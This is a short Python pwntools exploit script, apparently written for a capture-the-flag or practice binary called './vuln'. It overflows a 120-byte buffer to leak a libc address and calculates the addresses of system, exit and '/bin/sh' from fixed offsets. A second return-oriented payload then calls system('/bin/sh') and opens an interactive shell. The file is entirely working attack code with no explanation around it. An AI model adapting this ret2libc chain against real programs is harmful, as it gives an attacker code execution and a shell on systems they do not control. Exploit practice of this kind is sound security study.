#!/bin/python3

from pwn import u64, p64, process, log, context
from sys import argv

LEAKFUNC = 0x401146
READFUNC = 0x40117c
POPRDI = 0x401273

SYSOSET = -0x1796f0
BINSHOSET = -0x3796e
EXITOSET = -0x183ea0

def main():

    ## default to silent
    if "-v" not in argv:
        context.log_level = 21

    ## create payload
    payload = b"\x90"*120
    payload += p64(LEAKFUNC)     # jump to leak function
    payload += p64(READFUNC)     # return to read
    payload += b"\x90"*13

    ## start process
    target = process("./vuln")

    ## send payload
    target.send(payload)

    ## get leak
    target.recvuntil(b"0x")
    libcleak = target.recvuntil(b" ")

    log.success(f"LIBCLEAK  : {libcleak.decode()}")

    ## calculate real addresses from leak
    libcleak = int(libcleak, 16)
    real_sys = libcleak + SYSOSET
    real_binsh = libcleak + BINSHOSET
    real_exit = libcleak + EXITOSET

    log.info(f"system address  : {hex(real_sys)}")
    log.info(f"exit address    : {hex(real_exit)}")
    log.info(f"/bin/sh address : {hex(real_binsh)}")

    ## create new payload
    payload = payload[:120]       # same overflow size
    payload += p64(POPRDI)        # pop address of string "/bin/sh" into rdi (arg1)
    payload += p64(real_binsh)    # "/bin/sh" on the stack for popping
    payload += p64(real_sys)      # return to system()
    payload += p64(POPRDI)        # pop 0 into rdi for clean exit
    payload += p64(0)
    payload += p64(real_exit)     # exit cleanly 

    ## send payload2
    target.send(payload)

    ## get shell
    target.clean()
    target.interactive()

if __name__ == "__main__":
    main()

